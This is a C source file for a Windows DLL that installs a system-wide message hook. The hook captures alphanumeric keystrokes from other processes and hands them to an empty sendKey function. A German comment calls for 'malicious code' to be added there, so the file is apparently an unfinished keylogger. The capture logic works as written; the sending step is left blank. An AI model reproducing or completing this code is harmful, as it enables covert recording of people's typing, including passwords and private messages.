#include "logger.h"

HANDLE g_DllHandle;
HHOOK  g_hMyHook;

LRESULT CALLBACK GetMsgProc(int code, WPARAM wParam, LPARAM lParam);

BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved)
{
	switch (ul_reason_for_call)
	{
	case DLL_PROCESS_ATTACH:
		g_DllHandle = hModule;
		break;
	}
	return TRUE;
}

void installHook(){
	g_hMyHook = SetWindowsHookEx(WH_GETMESSAGE, GetMsgProc, (HINSTANCE)g_DllHandle, 0);
}

void removeHook()
{
	UnhookWindowsHookEx(g_hMyHook);
}

void sendKey(char key)
{
}

LRESULT CALLBACK GetMsgProc(int code, WPARAM wParam, LPARAM lParam)
{
	// TODO: füge schadcode hier hinzu

	if (code == HC_ACTION)
	{
		LPMSG pmsg = (LPMSG)lParam;
		if (pmsg->message == WM_KEYDOWN)
		{
			WPARAM key = pmsg->wParam;

			if (isalnum(key) != 0){
				sendKey(key);
			}
		}
	}

	return (CallNextHookEx(g_hMyHook, code, wParam, lParam));
}